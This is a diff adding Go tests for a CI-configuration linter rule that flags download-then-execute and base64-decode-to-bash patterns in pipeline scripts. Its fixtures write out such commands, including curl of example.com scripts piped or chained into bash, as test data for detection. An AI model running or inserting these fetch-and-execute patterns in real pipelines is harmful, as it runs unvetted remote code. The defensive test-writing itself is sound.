@@ -96,6 +96,61 @@ setup:
 	}
 }
 
+func TestGL011_InlineBase64DecodeBash(t *testing.T) {
+	f := findings011(t, `
+setup:
+  script:
+    - echo "ZWNobyBwd25lZAo=" | base64 -d | bash
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding for echo | base64 -d | bash, got %d", len(f))
+	}
+}
+
+func TestGL011_DownloadThenExecAnd(t *testing.T) {
+	f := findings011(t, `
+setup:
+  script:
+    - curl -fsSL https://example.com/install.sh -o install.sh && bash install.sh
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding for curl -o file && bash file, got %d", len(f))
+	}
+}
+
+func TestGL011_RedirectThenExecSemicolon(t *testing.T) {
+	f := findings011(t, `
+setup:
+  script:
+    - curl -fsSL https://example.com/payload.sh > install.sh; sh install.sh
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding for curl > file; sh file, got %d", len(f))
+	}
+}
+
+func TestGL011_PipeInsideQuotedString_NoFinding(t *testing.T) {
+	f := findings011(t, `
+setup:
+  script:
+    - 'echo "to install run curl https://x.sh | bash yourself"'
+`)
+	if len(f) != 0 {
+		t.Errorf("expected no finding for | bash inside a quoted string, got %d", len(f))
+	}
+}
+
+func TestGL011_ChecksumVerifiedThenExec_NoFinding(t *testing.T) {
+	f := findings011(t, `
+setup:
+  script:
+    - curl -fsSL https://example.com/install.sh -o install.sh && sha256sum -c install.sh.sha256 && bash install.sh
+`)
+	if len(f) != 0 {
+		t.Errorf("expected no finding when checksum is verified before exec, got %d", len(f))
+	}
+}
+
 func TestGL011_CurlDownloadOnly_NoFinding(t *testing.T) {
 	f := findings011(t, `
 setup:
